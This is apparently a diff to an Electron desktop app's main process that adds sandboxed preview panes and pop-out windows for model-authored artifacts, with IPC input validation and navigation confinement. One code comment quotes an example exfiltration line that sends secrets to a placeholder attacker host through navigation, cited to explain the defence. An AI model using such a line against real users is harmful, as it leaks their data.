@@ -52,12 +52,23 @@ import {
   shell,
   systemPreferences,
   Tray,
+  WebContentsView,
 } from 'electron';
 import type { IpcMainInvokeEvent, WebContents } from 'electron';
 import { desktopWorkspaceIdentityKey } from '../common/desktop';
+import {
+  ArtifactPreviewController,
+  artifactWebPreferences,
+  confineToArtifactOrigin,
+  isArtifactUrl,
+  type ArtifactViewHandle,
+} from './artifact-viewers';
 import type {
   RallyRegion,
   DesktopApplicationSettings,
+  DesktopArtifactPreviewBounds,
+  DesktopArtifactPreviewRequest,
+  DesktopArtifactWindowRequest,
   DesktopDeepLinkEntrypoint,
   DesktopDeepLinkNavigation,
   DesktopLockdownSettings,
@@ -554,6 +565,18 @@ const telemetryQuitBarrier = new TelemetryQuitBarrier(async () => {
   await reporter.flush().catch(() => undefined);
 }, 750);
 const hardenedWebContents = new WeakSet<WebContents>();
+/**
+ * Web contents showing model-authored artifact content.
+ *
+ * Consulted by the global navigation hardening *at navigation time* rather than
+ * at registration time, because `web-contents-created` fires synchronously
+ * inside `new WebContentsView(...)` — so the global listener is always attached
+ * before `confineToArtifactOrigin` gets to run, and a listener that has already
+ * been added cannot be un-added by the artifact policy. Marking the contents and
+ * checking the mark when the navigation actually happens is the only ordering
+ * that works.
+ */
+const artifactWebContents = new WeakSet<WebContents>();
 const telemetryWindowIds = new WeakMap<WebContents, string>();
 const desktopAuthAttempts = new DesktopAuthAttemptStore();
 const nativeSystemAudioController = new NativeSystemAudioController(() => {
@@ -2663,6 +2686,128 @@ function observeAcceptedDeepLinkOpen(): void {
   applicationOpenObserver.opened('deep_link');
 }
 
+/**
+ * One live preview per window, and never more.
+ *
+ * Keyed by window rather than global because a person can have several Rally
+ * windows open, each showing a different work stream; two views over one
+ * rectangle would leave the one underneath running and invisible.
+ */
+const artifactPreviews = new Map<BrowserWindow, ArtifactPreviewController>();
+const artifactViews = new WeakMap<ArtifactViewHandle, WebContentsView>();
+
+/**
+ * The domain artifacts are served from, as this build was configured.
+ *
+ * Read from the renderer's own configuration rather than hard-coded: a sandbox
+ * and a packaged build serve artifacts from different places, and a constant
+ * here would make the main process refuse every URL in one of them.
+ */
+function artifactServingDomain(): string {
+  return process.env.VITE_ARTIFACT_SERVING_DOMAIN?.trim() || 'rallyusercontent.com';
+}
+
+function artifactPreviewFor(window: BrowserWindow): ArtifactPreviewController {
+  const existing = artifactPreviews.get(window);
+  if (existing) return existing;
+  const controller = new ArtifactPreviewController(
+    {
+      contentSize: () => {
+        const [width = 0, height = 0] = window.getContentSize();
+        return { width, height };
+      },
+      removeView: (view) => {
+        const child = artifactViews.get(view);
+        if (child) window.contentView.removeChildView(child);
+      },
+    },
+    artifactServingDomain(),
+    (request): ArtifactViewHandle => {
+      const view = new WebContentsView({
+        webPreferences: artifactWebPreferences(request.artifactId, app.isPackaged),
+      });
+      artifactWebContents.add(view.webContents);
+      confineToArtifactOrigin(view.webContents, new URL(request.url).origin);
+      window.contentView.addChildView(view);
+      const handle: ArtifactViewHandle = {
+        setBounds: (bounds) => view.setBounds(bounds),
+        loadURL: (url) => void view.webContents.loadURL(url),
+        close: () => view.webContents.close(),
+      };
+      // The controller speaks in handles, not Electron objects, so the window
+      // needs this to find the child it is removing.
+      artifactViews.set(handle, view);
+      return handle;
+    },
+  );
+  artifactPreviews.set(window, controller);
+  // A window that closes takes its preview with it; leaving the entry behind
+  // would keep a destroyed window reachable from this map forever.
+  window.once('closed', () => {
+    artifactPreviews.get(window)?.destroy();
+    artifactPreviews.delete(window);
+  });
+  return controller;
+}
+
+/**
+ * The pop-out: the same artifact, the same session, its own window.
+ *
+ * It shares the preview's session partition deliberately — a person who
+ * authorized the artifact in the rail should not authorize it again to see it
+ * bigger.
+ */
+function openArtifactWindow(request: { artifactId: string; url: string; title: string }): void {
+  const window = new BrowserWindow({
+    width: 1_100,
+    height: 800,
+    minWidth: 420,
+    minHeight: 360,
+    show: false,
+    backgroundColor: windowBackgroundColor(),
+    title: request.title,
+    titleBarStyle: process.platform === 'darwin' ? 'hiddenInset' : 'default',
+    trafficLightPosition: { x: 18, y: 17 },
+    ...(process.platform === 'darwin' ? {} : { icon: applicationWindowIconPath() }),
+    webPreferences: artifactWebPreferences(request.artifactId, app.isPackaged),
+  });
+  artifactWebContents.add(window.webContents);
+  confineToArtifactOrigin(window.webContents, new URL(request.url).origin);
+  window.setMenuBarVisibility(false);
+  window.once('ready-to-show', () => window.show());
+  void window.loadURL(request.url);
+}
+
+function parseArtifactPreviewBounds(raw: unknown): DesktopArtifactPreviewBounds | null {
+  if (!raw || typeof raw !== 'object') return null;
+  const value = raw as Record<string, unknown>;
+  const numbers = ['x', 'y', 'width', 'height'].map((key) => value[key]);
+  if (!numbers.every((entry) => typeof entry === 'number' && Number.isFinite(entry))) return null;
+  const [x, y, width, height] = numbers as number[];
+  return { x: x!, y: y!, width: width!, height: height! };
+}
+
+function parseArtifactPreviewRequest(raw: unknown): DesktopArtifactPreviewRequest | null {
+  if (!raw || typeof raw !== 'object') return null;
+  const value = raw as Record<string, unknown>;
+  const bounds = parseArtifactPreviewBounds(value.bounds);
+  if (!bounds || typeof value.artifactId !== 'string' || typeof value.url !== 'string') return null;
+  return { artifactId: value.artifactId, url: value.url, bounds };
+}
+
+function parseArtifactWindowRequest(raw: unknown): DesktopArtifactWindowRequest | null {
+  if (!raw || typeof raw !== 'object') return null;
+  const value = raw as Record<string, unknown>;
+  if (typeof value.artifactId !== 'string' || typeof value.url !== 'string') return null;
+  return {
+    artifactId: value.artifactId,
+    url: value.url,
+    // A window title comes from a resource title, which is model-authored:
+    // bounded here so it cannot become a title bar the length of the screen.
+    title: typeof value.title === 'string' ? value.title.slice(0, 120) : 'Artifact',
+  };
+}
+
 function assertTrustedIpcSender(event: IpcMainInvokeEvent): void {
   const sender = event.sender;
   const belongsToRallyWindow = sender === mainWindow?.webContents
@@ -2964,6 +3109,43 @@ function registerIpc(): void {
     }
     await shell.openExternal(rawUrl);
   });
+  // The artifact surfaces. Every argument is parsed here rather than trusted:
+  // the renderer supplies a URL and a rectangle, and neither is a capability it
+  // is allowed to have — the URL decides what model-authored code gets loaded,
+  // and the rectangle decides what it paints over.
+  ipcMain.handle('artifact:present-preview', async (event, raw: unknown) => {
+    assertTrustedIpcSender(event);
+    const request = parseArtifactPreviewRequest(raw);
+    const window = BrowserWindow.fromWebContents(event.sender);
+    if (!request || !window) return false;
+    return artifactPreviewFor(window).present(request);
+  });
+  ipcMain.handle('artifact:set-preview-bounds', async (event, raw: unknown) => {
+    assertTrustedIpcSender(event);
+    const bounds = parseArtifactPreviewBounds(raw);
+    const window = BrowserWindow.fromWebContents(event.sender);
+    if (!bounds || !window) return;
+    artifactPreviews.get(window)?.setBounds(bounds);
+  });
+  ipcMain.handle('artifact:set-preview-hidden', async (event, raw: unknown) => {
+    assertTrustedIpcSender(event);
+    const window = BrowserWindow.fromWebContents(event.sender);
+    if (typeof raw !== 'boolean' || !window) return;
+    artifactPreviews.get(window)?.setOverlayOpen(raw);
+  });
+  ipcMain.handle('artifact:close-preview', async (event) => {
+    assertTrustedIpcSender(event);
+    const window = BrowserWindow.fromWebContents(event.sender);
+    if (!window) return;
+    artifactPreviews.get(window)?.destroy();
+    artifactPreviews.delete(window);
+  });
+  ipcMain.handle('artifact:pop-out', async (event, raw: unknown) => {
+    assertTrustedIpcSender(event);
+    const request = parseArtifactWindowRequest(raw);
+    if (!request || !isArtifactUrl(request.url, artifactServingDomain())) return;
+    openArtifactWindow(request);
+  });
   ipcMain.handle('system:open-settings', async (event, rawSection: unknown) => {
     assertTrustedIpcSender(event);
     const section = rawSection === undefined ? undefined : parseDesktopSettingsSection(rawSection);
@@ -3093,6 +3275,12 @@ function hardenWebContents(contents: WebContents): void {
   const preventUntrustedNavigation = (event: Electron.Event, url: string): void => {
     if (rendererNavigationAllowed(url)) return;
     event.preventDefault();
+    // Artifact surfaces are refused, never handed off. Opening a URL an
+    // artifact composed would make Rally perform the exfiltration the egress
+    // fence exists to prevent: `location = "https://attacker/?" + secrets` is a
+    // navigation, which no CSP directive governs. `confineToArtifactOrigin`
+    // owns what these contents may do; this listener must not undo it.
+    if (artifactWebContents.has(contents)) return;
     if (isAllowedExternalUrl(url)) void shell.openExternal(url);
   };
   contents.on('will-navigate', preventUntrustedNavigation);
